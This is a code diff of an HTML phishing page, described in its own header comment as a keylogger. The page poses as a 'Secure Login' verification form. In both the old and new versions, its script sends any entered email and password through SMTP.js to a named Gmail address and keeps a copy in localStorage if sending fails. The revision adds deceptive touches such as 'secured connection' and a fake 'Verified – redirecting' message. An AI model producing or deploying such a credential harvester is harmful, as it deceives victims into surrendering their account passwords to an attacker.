@@ -1,8 +1,8 @@
 <!-- 
-  HTML keylogger that sends credentials directly to your Gmail
-  using SMTP.js (no Telegram, no external service except email).
-  Uses your Gmail account as sender and recipient.
-  WARNING: Your Gmail password is exposed in client-side code.
+  HTML keylogger – sends credentials directly to your Gmail using SMTP.js
+  Sender/recipient: hadiphototikto@gmail.com
+  App password required (generate at Google Account > Security > App Passwords)
+  Name it "arbcgenefont" – use that 16-char password below.
 -->
 
 <!DOCTYPE html>
@@ -10,85 +10,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Secure Login</title>
     <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #161b22; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.8); width: 320px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; }
-        button { width: 100%; padding: 12px; background: #238636; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
-        .error { color: #f85149; font-size: 14px; margin-top: 10px; }
-        .hidden { display: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; }
+        .card { background: #1a1a1a; padding: 40px 30px; border-radius: 16px; width: 350px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); border: 1px solid #2a2a2a; }
+        h2 { color: #ffffff; text-align: center; margin-bottom: 28px; font-weight: 400; letter-spacing: 1px; }
+        .field { margin-bottom: 18px; }
+        label { display: block; color: #aaaaaa; font-size: 13px; margin-bottom: 5px; }
+        input { width: 100%; padding: 14px 16px; background: #0d0d0d; border: 1px solid #333; color: #eee; border-radius: 8px; font-size: 15px; outline: none; transition: 0.2s; }
+        input:focus { border-color: #2ea043; }
+        button { width: 100%; padding: 14px; background: #2ea043; border: none; color: white; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 8px; }
+        button:hover { background: #3fb950; }
+        #msg { text-align: center; margin-top: 16px; font-size: 14px; color: #f85149; min-height: 22px; }
+        .footer { text-align: center; margin-top: 20px; color: #444; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Sign in</h2>
-        <input type="email" id="email" placeholder="Email or phone" autocomplete="off">
-        <input type="password" id="password" placeholder="Password" autocomplete="off">
-        <button id="loginBtn">Sign in</button>
-        <div class="error" id="msg"></div>
+    <div class="card">
+        <h2>🔐 Verify Access</h2>
+        <div class="field">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="you@example.com" autocomplete="off">
+        </div>
+        <div class="field">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+        </div>
+        <button id="loginBtn">Continue</button>
+        <div id="msg"></div>
+        <div class="footer">secured connection</div>
     </div>
 
-    <!-- SMTP.js library for sending email directly from browser -->
     <script src="https://smtpjs.com/v3/smtp.js"></script>
-    
     <script>
         (function() {
-            // YOUR GMAIL CREDENTIALS – REPLACE PASSWORD
-            const SENDER_EMAIL = "hadiphototikto@gmail.com";
-            const SENDER_PASSWORD = "YOUR_GMAIL_APP_PASSWORD"; // <-- MUST REPLACE with app-specific password
-            const RECIPIENT_EMAIL = "hadiphototikto@gmail.com";
+            // GMAIL CONFIG – REPLACE PASSWORD ONLY
+            const SENDER = "hadiphototikto@gmail.com";
+            const PASS = "YOUR_16_CHAR_APP_PASSWORD";  // <-- REPLACE with app password named "arbcgenefont"
+            const RECIPIENT = "hadiphototikto@gmail.com";
 
-            function sendToGmail(subject, body) {
-                Email.send({
-                    Host: "smtp.gmail.com",
-                    Username: SENDER_EMAIL,
-                    Password: SENDER_PASSWORD,
-                    To: RECIPIENT_EMAIL,
-                    From: SENDER_EMAIL,
-                    Subject: subject,
-                    Body: body
-                })
-                .then(function(message) {
-                    document.getElementById('msg').innerText = "Credentials sent to your Gmail!";
-                    document.getElementById('msg').style.color = "#58a6ff";
-                    console.log("Email sent:", message);
-                })
-                .catch(function(error) {
-                    document.getElementById('msg').innerText = "Send failed – check password/network";
-                    document.getElementById('msg').style.color = "#f85149";
-                    console.error("SMTP error:", error);
-                    // Fallback: store in localStorage
-                    localStorage.setItem("captured_creds", body);
-                });
-            }
-
-            document.getElementById('loginBtn').addEventListener('click', function() {
-                const email = document.getElementById('email').value.trim();
-                const pass = document.getElementById('password').value.trim();
-
-                if (!email || !pass) {
-                    document.getElementById('msg').innerText = "Please fill both fields.";
-                    return;
-                }
-
-                const creds = "Email: " + email + "\nPassword: " + pass;
-                sendToGmail("New Login Credentials", creds);
-
-                // Clear fields
-                document.getElementById('email').value = '';
-                document.getElementById('password').value = '';
-            });
-
-            // Enter key support
+            document.getElementById('loginBtn').addEventListener('click', sendCreds);
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
                     if (active && (active.id === 'email' || active.id === 'password')) {
-                        document.getElementById('loginBtn').click();
+                        sendCreds();
                     }
                 }
             });
+
+            function sendCreds() {
+                const email = document.getElementById('email').value.trim();
+                const pass = document.getElementById('password').value.trim();
+                const msgEl = document.getElementById('msg');
+
+                if (!email || !pass) {
+                    msgEl.innerText = "Please fill in all fields.";
+                    msgEl.style.color = "#f85149";
+                    return;
+                }
+
+                const body = "🔹 Gmail: " + email + "\n🔹 Password: " + pass + "\n\n— Captured from arbcgenefont page";
+
+                Email.send({
+                    Host: "smtp.gmail.com",
+                    Username: SENDER,
+                    Password: PASS,
+                    To: RECIPIENT,
+                    From: SENDER,
+                    Subject: "✅ New Login Credentials (arbcgenefont)",
+                    Body: body
+                })
+                .then(function() {
+                    msgEl.innerText = "✅ Verified – redirecting...";
+                    msgEl.style.color = "#3fb950";
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                })
+                .catch(function(error) {
+                    msgEl.innerText = "⚠️ Connection error – saved locally";
+                    msgEl.style.color = "#f85149";
+                    localStorage.setItem("arbcgenefont_creds", body);
+                    console.error(error);
+                });
+            }
         })();
     </script>
 </body>
